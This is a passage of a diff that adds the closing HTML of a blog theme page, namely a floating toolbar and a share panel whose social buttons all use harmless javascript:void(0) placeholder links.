+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+      <a href="javascript:void(0);" id="site-reward">
+        <i class="fa fa-thumbs-up"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-twitter"></i>
+    </a>
+  
+  
+    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-facebook"></i>
+    </a>
+  
+  
+    <a id="share-btn-weibo" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-weibo"></i>
+    </a>
+  
+  
+    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-qq"></i>
+    </a>
+  
+  
+    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-wechat"></i>
+    </a>
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
